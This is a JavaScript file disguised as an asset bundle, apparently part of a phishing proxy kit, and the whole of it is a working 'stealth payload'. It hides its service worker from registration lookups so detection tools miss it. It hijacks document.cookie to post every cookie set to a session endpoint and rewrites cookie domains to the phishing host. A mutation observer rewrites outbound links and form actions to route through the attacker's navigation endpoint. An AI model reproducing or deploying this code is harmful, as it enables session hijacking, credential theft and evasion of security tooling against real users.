// assets/bundle_x9f3.js – Stealth payload (no EvilWorker fingerprints)
(function() {
  // ---- HIDE SERVICE WORKER ----
  // Override getRegistration to hide our SW
  const origGetReg = navigator.serviceWorker.getRegistration;
  navigator.serviceWorker.getRegistration = function(scope) {
    return origGetReg.apply(this, arguments).then(reg => {
      if (reg && reg.active && reg.active.scriptURL && reg.active.scriptURL.endsWith('worker_8t2r.js')) {
        return undefined;
      }
      return reg;
    });
  };

  // Override getRegistrations to filter out our SW
  const origGetRegs = navigator.serviceWorker.getRegistrations;
  navigator.serviceWorker.getRegistrations = function() {
    return origGetRegs.apply(this, arguments).then(regs => {
      return regs.filter(reg => {
        return !(reg.active && reg.active.scriptURL && reg.active.scriptURL.endsWith('worker_8t2r.js'));
      });
    });
  };

  // ---- HIJACK DOCUMENT.COOKIE ----
  const origCookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
  Object.defineProperty(document, 'cookie', {
    ...origCookieDesc,
    get() {
      return origCookieDesc.get.call(document);
    },
    set(cookie) {
      // Send cookie to our session endpoint (fire-and-forget)
      fetch('/api/session', {
        method: 'POST',
        body: cookie,
        headers: { 'Content-Type': 'text/plain' }
      }).catch(() => {}); // silent fail

      // Rewrite Domain attribute to our phishing domain (no server round-trip)
      let modified = cookie;
      const domainMatch = cookie.match(/domain=([^;]+)/i);
      if (domainMatch) {
        // Replace domain with current hostname (phishing domain)
        modified = cookie.replace(/domain=([^;]+)/i, `domain=${location.hostname}`);
      }
      // Also strip Secure flag if needed? We'll leave as-is.
      origCookieDesc.set.call(document, modified);
    }
  });

  // ---- MUTATION OBSERVER FOR HREF/ACTION ----
  const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      if (m.type === 'attributes') {
        rewriteAttr(m.target, m.attributeName);
      } else if (m.type === 'childList') {
        for (const node of m.addedNodes) {
          ['href', 'action'].forEach(attr => {
            if (node[attr]) rewriteAttr(node, attr);
          });
        }
      }
    }
  });

  function rewriteAttr(node, attr) {
    try {
      const url = new URL(node[attr]);
      if (url.origin !== location.origin) {
        // Rewrite to our nav endpoint with 'dest' parameter
        const newUrl = `/api/nav?dest=${encodeURIComponent(url.href)}`;
        node[attr] = newUrl;
      }
    } catch (e) {}
  }

  observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: ['href', 'action']
  });
})();
